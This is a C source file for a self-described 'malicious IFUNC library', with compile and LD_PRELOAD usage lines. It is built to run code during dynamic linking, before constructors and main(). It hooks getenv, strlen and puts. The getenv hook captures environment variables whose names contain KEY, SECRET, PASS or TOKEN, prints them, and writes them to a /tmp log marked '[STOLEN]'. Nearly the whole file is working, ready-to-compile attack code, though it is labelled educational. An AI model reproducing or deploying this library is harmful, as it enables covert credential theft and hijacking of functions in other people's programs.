/*
 * evil_ifunc.c - Malicious IFUNC Library
 *
 * This library demonstrates IFUNC-based attacks:
 *
 *   1. Define IFUNC symbols that shadow common functions
 *   2. Resolver runs during linking (before main, before constructors!)
 *   3. Execute malicious code in the resolver
 *   4. Redirect function calls to our implementations
 *
 * When loaded via LD_PRELOAD, this library's IFUNC resolvers
 * run BEFORE:
 *   - LD_PRELOAD constructors
 *   - Library constructors
 *   - main()
 *
 * This is EARLIER than constructor-based attacks!
 *
 * Usage:
 *   LD_PRELOAD=./libevil_ifunc.so ./target
 *
 * Compile:
 *   gcc -shared -fPIC -o libevil_ifunc.so evil_ifunc.c -ldl
 *
 * EDUCATIONAL PURPOSES ONLY
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <time.h>

/* Color codes */
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN    "\033[1;36m"
#define RESET   "\033[0m"

#define LOG_FILE "/tmp/ifunc_hijack.log"

/* ═══════════════════════════════════════════════════════════════════════════
 * GLOBAL STATE
 * ═══════════════════════════════════════════════════════════════════════════ */

static FILE *logfile = NULL;
static int resolver_execution_count = 0;
static char *(*real_getenv)(const char *) = NULL;

/* ═══════════════════════════════════════════════════════════════════════════
 * EARLY EXECUTION IN RESOLVER
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * This code runs during dynamic linking, before ANYTHING else!
 * We can't use printf/fprintf here safely (libc might not be fully initialized)
 * But we can do syscalls directly or use write().
 */

static void resolver_early_exec(const char *func_name) {
    resolver_execution_count++;

    /* Direct write to stderr - safe before libc init */
    char buf[256];
    int len = snprintf(buf, sizeof(buf),
        RED "[IFUNC RESOLVER] " YELLOW "Resolving %s - PID %d\n" RESET,
        func_name, getpid());
    write(STDERR_FILENO, buf, len);

    /* On first resolver call, do reconnaissance */
    if (resolver_execution_count == 1) {
        const char *banner =
            "\n"
            RED "╔════════════════════════════════════════════════════════════════╗\n" RESET
            RED "║" YELLOW "         ★ IFUNC RESOLVER PAYLOAD EXECUTING ★                 " RED "║\n" RESET
            RED "║" RESET "                                                              " RED "║\n" RESET
            RED "║" RESET " Code running BEFORE constructors, before main()!            " RED "║\n" RESET
            RED "║" RESET " This is the EARLIEST user-space code execution point!       " RED "║\n" RESET
            RED "╚════════════════════════════════════════════════════════════════╝\n" RESET
            "\n";
        write(STDERR_FILENO, banner, strlen(banner));

        /* Try to open log file */
        logfile = fopen(LOG_FILE, "w");
        if (logfile) {
            time_t now = time(NULL);
            fprintf(logfile, "═══════════════════════════════════════════════════════\n");
            fprintf(logfile, "IFUNC HIJACKING LOG\n");
            fprintf(logfile, "Time: %s", ctime(&now));
            fprintf(logfile, "PID: %d\n", getpid());
            fprintf(logfile, "═══════════════════════════════════════════════════════\n\n");
            fprintf(logfile, "[RESOLVER] First resolver executing\n");
            fflush(logfile);
        }
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOKED FUNCTION: getenv
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Our malicious getenv implementation */
static char *evil_getenv(const char *name) {
    /* Get real getenv */
    if (!real_getenv) {
        real_getenv = dlsym(RTLD_NEXT, "getenv");
    }

    char *value = real_getenv(name);

    /* Log sensitive lookups */
    if (value && (strstr(name, "KEY") || strstr(name, "SECRET") ||
                  strstr(name, "PASS") || strstr(name, "TOKEN"))) {
        fprintf(stderr, RED "[IFUNC HOOK] " MAGENTA "getenv(\"%s\") = \"%s\"\n" RESET,
                name, value);

        if (logfile) {
            fprintf(logfile, "[STOLEN] %s = %s\n", name, value);
            fflush(logfile);
        }
    }

    return value;
}

/* Resolver for getenv - THIS RUNS DURING LINKING! */
static void *getenv_resolver(void) {
    resolver_early_exec("getenv");

    /* Return our hook function */
    return evil_getenv;
}

/* Declare IFUNC - shadows libc's getenv when preloaded */
char *getenv(const char *name) __attribute__((ifunc("getenv_resolver")));

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOKED FUNCTION: strlen (commonly used, good for tracing)
 * ═══════════════════════════════════════════════════════════════════════════ */

static size_t (*real_strlen)(const char *) = NULL;

static size_t evil_strlen(const char *s) {
    if (!real_strlen) {
        real_strlen = dlsym(RTLD_NEXT, "strlen");
    }

    /* Just pass through - but we COULD modify behavior */
    return real_strlen(s);
}

static void *strlen_resolver(void) {
    resolver_early_exec("strlen");
    return evil_strlen;
}

size_t strlen(const char *s) __attribute__((ifunc("strlen_resolver")));

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOKED FUNCTION: puts (to show interception)
 * ═══════════════════════════════════════════════════════════════════════════ */

static int (*real_puts)(const char *) = NULL;

static int evil_puts(const char *s) {
    if (!real_puts) {
        real_puts = dlsym(RTLD_NEXT, "puts");
    }

    /* Prefix intercepted output */
    fprintf(stderr, CYAN "[IFUNC INTERCEPT] " RESET);
    return real_puts(s);
}

static void *puts_resolver(void) {
    resolver_early_exec("puts");
    return evil_puts;
}

int puts(const char *s) __attribute__((ifunc("puts_resolver")));

/* ═══════════════════════════════════════════════════════════════════════════
 * DESTRUCTOR
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((destructor))
static void evil_fini(void) {
    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "         ★ IFUNC HIJACKING SESSION COMPLETE ★                  " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET " Resolvers executed: " GREEN "%d" RESET "                                       " RED "║\n" RESET, resolver_execution_count);
    fprintf(stderr, RED "║" RESET " Log: " BLUE LOG_FILE RESET "                                  " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    if (logfile) {
        fprintf(logfile, "\n[+] Session complete. Resolvers executed: %d\n", resolver_execution_count);
        fclose(logfile);
    }
}
